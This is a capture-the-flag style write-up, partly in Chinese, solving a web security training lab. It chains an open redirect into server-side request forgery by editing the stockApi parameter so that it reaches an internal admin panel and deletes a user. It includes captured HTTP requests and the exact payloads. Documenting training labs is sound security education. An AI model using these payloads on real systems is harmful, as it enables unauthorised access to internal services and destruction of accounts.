```
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.



該實驗室具有庫存檢查功能，可從內部系統獲取數據。

為解決實驗室問題，更改庫存檢查 URL 以訪問管理界面 http://192.168.0.12:8080/admin 並刪除用戶 carlos。

庫存檢查器已被限制為只能訪問本地應用程序，因此您需要首先找到影響應用程序的開放重定向。




```



```http
POST /product/stock HTTP/1.1
Host: 0a99001f042030cac06c6817003d0078.web-security-academy.net
Cookie: session=Cr66pqfDrSC3f7pvzOHzPafhEwtNVNKt; session=6ilZY6AHmxKKipeh8j12eFXUo6w6wxRy
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0a99001f042030cac06c6817003d0078.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: https://0a99001f042030cac06c6817003d0078.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

```


APi 可以從內網請求資料。並顯示出庫存
```http
stockApi=/product/stock/check?productId=2&storeId=1

```



BP 抓Next product 按鈕
```http
GET /product/nextProduct?currentProductId=5&path=/product?productId=6 HTTP/1.1
Host: 0a99001f042030cac06c6817003d0078.web-security-academy.net
Cookie: session=Ip8gZHBNealTX2gzTcy10gx1RLQcvnDW; session=6ilZY6AHmxKKipeh8j12eFXUo6w6wxRy
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0a99001f042030cac06c6817003d0078.web-security-academy.net/product?productId=5
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close



```

關鍵:

```http

GET /product/nextProduct?path=/product?productId=6 

/product/nextProduct?path=/product?productId=6

```

這跟我們上面的stockApiAPI  很類似。
```http
stockApi=/product/stock/check?productId=2&storeId=1


```


修改
```
stockApi=/product/nextProduct?path=/product?productId=6
```
太棒了，可以抓到其他商品畫面。


修改路徑
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```
太棒了，可以抓admin畫面。


f12
```
<a href="/http://192.168.0.12:8080/admin/delete?username=carlos">Delete</a>
```


修改刪除路徑
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

成功
